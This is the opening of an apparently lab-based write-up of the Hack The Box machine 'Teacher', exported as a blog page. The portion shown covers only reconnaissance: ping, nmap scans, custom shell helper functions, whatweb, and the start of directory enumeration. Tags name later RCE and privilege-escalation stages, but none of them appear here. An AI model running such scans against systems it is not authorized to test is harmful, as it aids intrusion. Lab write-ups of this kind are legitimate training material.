<!DOCTYPE html> <html lang="es"><head>
<title>Machine Teacher</title>
<base href=".">
<meta name="pathname" content="machine-teacher.html">
<meta name="description" content="Blog - Machine Teacher">
<meta property="og:title" content="Machine Teacher">
<meta property="og:description" content="Blog - Machine Teacher">
<meta property="og:type" content="website">
<meta property="og:url" content="machine-teacher.html">
<meta property="og:image" content="img/pasted-image-20251107142243.png">
<meta charset="UTF-8"><meta property="og:site_name" content="Blog"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0"><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="site-lib/rss.xml"><script async="" id="webpage-script" src="site-lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="site-lib/media/favicon.png"><link rel="stylesheet" href="site-lib/styles/obsidian.css"><link rel="stylesheet" href="site-lib/styles/theme.css"><link rel="preload" href="site-lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="site-lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/main-styles.css"></noscript><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-vertical-spacing:1.3em;--sidebar-margin:12px}:root{background-color:#202124}.sidebar{height:100%;font-size:14px;z-index:10;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));position:relative;overflow:hidden;overflow:clip;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}#left-sidebar{left:0}#right-sidebar{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}.sidebar.floating{position:absolute}.sidebar .leaf-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .leaf-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}#left-sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}#right-sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar #left-sidebar-content,.sidebar #right-sidebar-content{contain:none!important;container-type:normal!important;animation:none!important}.sidebar:has(.leaf-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:calc(2.3em + 2 * var(--sidebar-margin));width:var(--sidebar-width);padding:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}#left-sidebar .sidebar-topbar{left:0;flex-direction:row;border-top-right-radius:var(--radius-l)}#right-sidebar .sidebar-topbar{right:0;flex-direction:row-reverse;border-top-left-radius:var(--radius-l)}#left-sidebar .topbar-content{margin-right:calc(2.3em + var(--sidebar-margin));flex-direction:row}#right-sidebar .topbar-content{margin-left:calc(2.3em + var(--sidebar-margin));flex-direction:row-reverse}.topbar-content{overflow:hidden visible;overflow:clip visible;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:2px!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}#left-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}#right-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.feature-title{margin-left:1px;text-transform:uppercase;letter-spacing:.06em;margin-top:.75em;margin-bottom:.75em}.feature-header{display:flex;align-items:center;padding-top:0;font-size:1em;padding-left:0}body.floating-sidebars .sidebar{position:absolute}body{transition:background-color var(--color-fade-speed) ease-in-out}#navbar:not(:empty){display:flex;align-items:center;justify-content:space-between;padding:.5em 1em;width:100%}#main{display:flex;flex-direction:column;height:100%;width:100%;align-items:stretch;justify-content:center}#main-horizontal{display:flex;flex-direction:row;flex-grow:1;width:100%;align-items:stretch;justify-content:center}#center-content{flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0!important;transition:opacity .2s ease-in-out;pointer-events:none}#center-content>.obsidian-document{padding-left:2em;padding-right:1em;margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}body #center-content>.obsidian-document>.markdown-preview-sizer{padding-bottom:80vh;width:100%;max-width:var(--line-width);flex-basis:var(--line-width);transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document>div{width:100%!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document:not([data-type=markdown]).embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}#center-content>.obsidian-document:not([data-type=markdown]).embed>*{max-width:100%;max-height:100%;object-fit:contain}:not(h1,h2,h3,h4,h5,h6,li):has(> :is(.math,table)){overflow-x:auto!important}#center-content>.obsidian-document:not([data-type=markdown]){overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.obsidian-document[data-type=attachment]{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;width:100%}.obsidian-document[data-type=attachment]>*{outline:0;border:none;box-shadow:none}.obsidian-document[data-type=attachment] :is(img){max-width:90%;max-height:90%;object-fit:contain}.obsidian-document[data-type=attachment]>:is(audio){width:100%;max-width:min(90%,var(--line-width))}.obsidian-document[data-type=attachment]>:is(embed,iframe,video){width:100%;height:100%;max-width:100%;max-height:100%;object-fit:contain}.canvas-wrapper>:is(.header,.footer){z-index:100;position:absolute;display:flex;justify-content:center;flex-direction:column;width:100%;align-items:center}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){let e=document.querySelectorAll("link[itemprop='include']");for(const t of e){let e=t.getAttribute("href");try{let o="";if(e.startsWith("https:")||e.startsWith("http:")||"file:"!=window.location.protocol){const n=await fetch(e);if(!n.ok){console.log("Could not include file: "+e),t?.remove();continue}o=await n.text()}else{const t=document.getElementById(btoa(encodeURI(e)));if(t){const e=JSON.parse(decodeURI(atob(t.getAttribute("value")??"")));o=e?.data??""}}let n=document.createRange().createContextualFragment(o);t.before(n),t.remove(),console.log("Included text: "+o),console.log("Included file: "+e)}catch(o){t?.remove(),console.log("Could not include file: "+e,o);continue}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script")));!function e(n){let l=o[n],c=n+1;l?(l&&"true"!=l.getAttribute("loaded")||n<o.length&&e(c),n<o.length&&l.addEventListener("load",(()=>e(c)))):n<o.length?e(c):t()}(0)}</script></head><body class="publish css-settings-manager styled-scrollbars show-inline-title show-ribbon is-focused"><a href="https://kmn9.github.io/theopendoor/index.html" style="position:fixed;top:10px;left:10px;z-index:9999;background:rgba(30,30,30,0.8);backdrop-filter:blur(6px);color:#fff;padding:8px 14px;border-radius:50px;text-decoration:none;font-family:'Inter',sans-serif;font-size:14px;line-height:1;box-shadow:0 4px 12px rgba(0,0,0,0.25);transition:all 0.3s ease;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:6px;" onmouseover="this.style.background='rgba(60,60,60,0.85)';" onmouseout="this.style.background='rgba(30,30,30,0.8)';" onclick="this.blur();" >←<span style='display:none;@media(min-width:600px){display:inline;}'> Back to main page</span></a><body class="publish css-settings-manager styled-scrollbars show-inline-title show-ribbon is-focused"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="parsed-feature-container" style="display: contents;"><link itemprop="include" href="site-lib/html/custom-head-content-content.html"></div><div id="main"><div id="navbar"></div><div id="main-horizontal"><div id="left-content" class="leaf" style="--sidebar-width: var(--sidebar-width-left);"><div id="left-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="left-sidebar-content" class="leaf-content"></div></div><script defer="">let ls = document.querySelector("#left-sidebar"); ls.classList.toggle("is-collapsed", window.innerWidth < 768); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div></div><div id="center-content" class="leaf"><div class="obsidian-document markdown-preview-view markdown-rendered node-insert-event is-readable-line-width allow-fold-headings allow-fold-lists show-indentation-guide show-properties" data-type="markdown"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><div class="header"><h1 class="page-title heading inline-title" id="Machine_Teacher_0">Machine Teacher</h1><div class="data-bar"></div></div><div class="markdown-preview-pusher" style="width: 1px; height: 0.1px; margin-bottom: 0px;"></div><div class="el-p"><p dir="auto">Tags: <a href="?query=tag:machine" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#machine">#machine</a> <a href="?query=tag:htb" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#htb">#htb</a> <a href="?query=tag:easy" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#easy">#easy</a> <a href="?query=tag:linux" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#linux">#linux</a> <a href="?query=tag:moodle" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#moodle">#moodle</a> <a href="?query=tag:oscp" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#oscp">#oscp</a> <a href="?query=tag:cron_job_abuse" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#cron_job_abuse">#cron_job_abuse</a> <a href="?query=tag:RCE" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#RCE">#RCE</a> <a href="?query=tag:code_injection" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#code_injection">#code_injection</a> <a href="?query=tag:privilege_escalation" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#privilege_escalation">#privilege_escalation</a> <a href="?query=tag:md5_hash_cracking" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#md5_hash_cracking">#md5_hash_cracking</a></p></div><div class="el-hr"><hr></div><div class="el-h1"><h1 data-heading="Information Gathering" dir="auto" class="heading" id="Information_Gathering_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Information Gathering</h1></div><div class="el-h2"><h2 data-heading="Discovering OS via TTL Using `ping`" dir="auto" class="heading" id="Discovering_OS_via_TTL_Using_`ping`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Discovering OS via TTL Using <code>ping</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">ping</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token number">10.10</span>.x.x
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107142243.png" src="img/pasted-image-20251107142243.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107142243.png" src="img/pasted-image-20251107142243.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Based on the <code>TTL</code> values obtained from the <code>ping</code> command, the operating system of the victim machine was identified as <code>Linux</code>. Typically, a TTL value below <code>64</code> corresponds to <code>Linux</code> systems, whereas a <code>TTL</code> between <code>65</code> and <code>128</code> indicates a <code>Windows</code> system. Next, a <code>UDP</code> port scan will be performed.</p></div><div class="el-h2"><h2 data-heading="UDP Port Scan Using `nmap`" dir="auto" class="heading" id="UDP_Port_Scan_Using_`nmap`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>UDP Port Scan Using <code>nmap</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">nmap <span class="token parameter variable">-sU</span> --min-rate <span class="token number">5000</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-vvv</span> <span class="token parameter variable">--open</span> --top-ports <span class="token number">100</span> <span class="token number">10.10</span>.10.153 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">'no-response'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107142307.png" src="img/pasted-image-20251107142307.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107142307.png" src="img/pasted-image-20251107142307.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">When the scan concluded, it did not report anything, so another scan, this time to discover open <code>TCP</code> ports, will be performed.</p></div><div class="el-h2"><h2 data-heading="TCP Port Scan Using a Custom `.zshrc` Function (`jmap`)" dir="auto" class="heading" id="TCP_Port_Scan_Using_a_Custom_`.zshrc`_Function_(`jmap`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port Scan Using a Custom <code>.zshrc</code> Function (<code>jmap</code>)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">jmap
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107142344.png" src="img/pasted-image-20251107142344.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107142344.png" src="img/pasted-image-20251107142344.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function-name function">jmap</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>[+] Introduce una IP<span class="token entity" title="\n">\n</span>"</span>
        <span class="token builtin class-name">read</span> <span class="token function">ip</span>
        <span class="token builtin class-name">echo</span>
        <span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> -p- --min-rate <span class="token number">5000</span> <span class="token parameter variable">-vvv</span> <span class="token parameter variable">--open</span> <span class="token variable">$ip</span> <span class="token parameter variable">-oG</span> scan
<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Using a custom function named <code>jmap</code>, previously defined in the <code>.zshrc</code>, the TCP scan was conducted, revealing that ports <code>80</code> were open. As illustrated in the image, port <code>80</code> is associated with an <code>HTTP</code> service, providing valuable context about the target machine. Following this discovery, a more detailed scan will be performed against the identified port:</p></div><div class="el-h2"><h2 data-heading="Represent Scan Information Legibly Using  a `.zshrc` Custom Function (`extractPorts`)" dir="auto" class="heading" id="Represent_Scan_Information_Legibly_Using_a_`.zshrc`_Custom_Function_(`extractPorts`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Represent Scan Information Legibly Using  a <code>.zshrc</code> Custom Function (<code>extractPorts</code>)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">extractPorts scan
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107142352.png" src="img/pasted-image-20251107142352.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107142352.png" src="img/pasted-image-20251107142352.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function-name function">extractPorts</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Extracting information..."</span>
        
        <span class="token assign-left variable">ip_address</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">grep</span> <span class="token parameter variable">-oP</span> <span class="token string">'Host: \K\S+'</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">1</span><span class="token variable">)</span></span> 

        <span class="token assign-left variable">ports</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">grep</span> <span class="token parameter variable">-oP</span> <span class="token string">'\d+(?=/open)'</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'\n'</span> <span class="token string">','</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/,$/\n/'</span><span class="token variable">)</span></span> 
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"IP Address: <span class="token variable">$ip_address</span>"</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Open ports: <span class="token variable">$ports</span><span class="token entity" title="\n">\n</span>"</span>
        <span class="token punctuation">{</span>
                <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"IP Address: <span class="token variable">$ip_address</span>"</span>
                <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Open ports: <span class="token variable">$ports</span><span class="token entity" title="\n">\n</span>"</span>
        <span class="token punctuation">}</span> <span class="token operator">&gt;&gt;</span> extractPorts.tmp
        <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$ports</span>"</span> <span class="token operator">|</span> xclip <span class="token parameter variable">-sel</span> clip
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Ports copied to clipboard<span class="token entity" title="\n">\n</span>"</span>
        <span class="token function">cat</span> extractPorts.tmp
        <span class="token function">rm</span> extractPorts.tmp
<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">The function shown in the image <code>extractPorts</code>, also previously defined in the <code>.zshrc</code>, displays the information from the previous scan and copies the ports to the clipboard. This makes it easier to perform a second scan on the discovered ports, especially when there are many.</p></div><div class="el-h2"><h2 data-heading="Discovering Service Versions on Open TCP Ports Using a `.zshrc` Custom Function (`jmap2`)" dir="auto" class="heading" id="Discovering_Service_Versions_on_Open_TCP_Ports_Using_a_`.zshrc`_Custom_Function_(`jmap2`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Discovering Service Versions on Open TCP Ports Using a <code>.zshrc</code> Custom Function (<code>jmap2</code>)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">jmap2
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107142431.png" src="img/pasted-image-20251107142431.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107142431.png" src="img/pasted-image-20251107142431.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function-name function">jmap2</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$#</span>"</span> <span class="token parameter variable">-ne</span> <span class="token number">2</span> <span class="token punctuation">]</span>
        <span class="token keyword">then</span>
                <span class="token builtin class-name">echo</span> <span class="token string">"Uso: jmap2 &lt;ip&gt; &lt;puertos&gt;"</span>
                <span class="token builtin class-name">return</span> <span class="token number">1</span>
        <span class="token keyword">fi</span>
        
        <span class="token builtin class-name">local</span> <span class="token assign-left variable">ip</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$1</span>"</span> 
        <span class="token builtin class-name">local</span> <span class="token assign-left variable">puertos</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span> 
        nmap -p<span class="token string">"<span class="token variable">$puertos</span>"</span> <span class="token parameter variable">-sCV</span> <span class="token string">"<span class="token variable">$ip</span>"</span>

<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">The function <code>jmap2</code>, also predefined in the <code>.zshrc</code>, was used to perform a targeted scan on the previously identified port. This scan aimed to enumerate the running services and their versions, as well as to apply basic reconnaissance scripts against those services. The results did not provide much important information, only the <code>Apache</code> version used and the website’s title. Following this, the technologies and services on the web server will be enumerated.</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Identifying Technologies and Services on the Web Service Using `whatweb` &amp; `wappalyzer`" dir="auto" class="heading" id="TCP_Port_80_Identifying_Technologies_and_Services_on_the_Web_Service_Using_`whatweb`_&amp;_`wappalyzer`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Identifying Technologies and Services on the Web Service Using <code>whatweb</code> &amp; <code>wappalyzer</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">whatweb http://10.10.10.153
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107142551.png" src="img/pasted-image-20251107142551.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107142551.png" src="img/pasted-image-20251107142551.png" target="_self"></span></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107142623.png" src="img/pasted-image-20251107142623.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107142623.png" src="img/pasted-image-20251107142623.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">By using <code>whatweb</code> and <code>wappalyzer</code>, we identified the technologies running on the specified <code>HTTP</code> services. The technologies identified did not appear important at first, but the <code>jQuery</code> used was an old version that is potentially vulnerable to <code>XSS</code> and <code>prototype pollution</code>. This exploitation vector is uncommon, so the web server will continue to be enumerated.</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Source Code Inspection" dir="auto" class="heading" id="TCP_Port_80_Source_Code_Inspection_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Source Code Inspection</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251108001910.png" src="img/pasted-image-20251108001910.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251108001910.png" src="img/pasted-image-20251108001910.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">When the source code was enumerated, there were no important findings; next, further enumeration will be performed to discover web routes and resources.</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Discovering Routes and Resources Using `dirsearch`" dir="auto" class="heading" id="TCP_Port_80_Discovering_Routes_and_Resources_Using_`dirsearch`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" 